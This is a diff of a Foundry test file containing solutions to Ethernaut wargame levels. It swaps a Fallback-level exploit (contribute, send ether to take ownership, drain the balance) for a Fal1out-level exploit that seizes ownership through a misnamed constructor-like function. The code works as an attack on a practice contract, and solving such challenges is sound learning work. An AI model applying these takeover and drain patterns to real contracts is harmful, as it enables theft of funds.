@@ -23,37 +23,38 @@ contract BaseSetUp is Test {
 
 contract Attack is BaseSetUp {
 
-    Fallback ethernautFallback;
+    Fallout ethernautFallout;
+    address payable levelAddress;
 
     function setUp() public virtual override {
         BaseSetUp.setUp();
 
         // Initialize level
-        FallbackFactory fallbackFactory = new FallbackFactory();
-        ethernaut.registerLevel(fallbackFactory);
+        FalloutFactory falloutFactory = new FalloutFactory();
+        ethernaut.registerLevel(falloutFactory);
 
         vm.prank(attacker);
-        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
-        ethernautFallback = Fallback(payable(levelAddress));
-        console.log("Ethernaut Fallback Challenge!");
+        levelAddress = payable(ethernaut.createLevelInstance(falloutFactory));
+        ethernautFallout = Fallout(levelAddress);
+        console.log("Ethernaut Fal1out Challenge!");
     }
 
     function testAttack() public {
         
         vm.startPrank(attacker);
 
-        // Make a valid contribution to bypass fallback
-        ethernautFallback.contribute{value: 0.0001 ether}();
-        assert(ethernautFallback.getContribution() == 0.0001 ether);
+        // Take ownership of the contract by calling Fal1out()
+        emit log_address(ethernautFallout.owner());
+        ethernautFallout.Fal1out{value: 0.1 ether}();
+        address newOwner = ethernautFallout.owner();
+        emit log_address(newOwner);
+        assert(newOwner == attacker);
 
-        // Use fallback to get ownership of the contract
-        (bool success, ) = address(ethernautFallback).call{value:0.0001 ether}("");
-        assert(ethernautFallback.owner() == attacker);
-
-        // Drain wallet
-        ethernautFallback.withdraw();
-        assert(address(ethernautFallback).balance == 0);
+        // Submit Level
+        bool passedLevel = ethernaut.submitLevelInstance(levelAddress);
+        assert(passedLevel);
 
         vm.stopPrank();
     }
 }
+
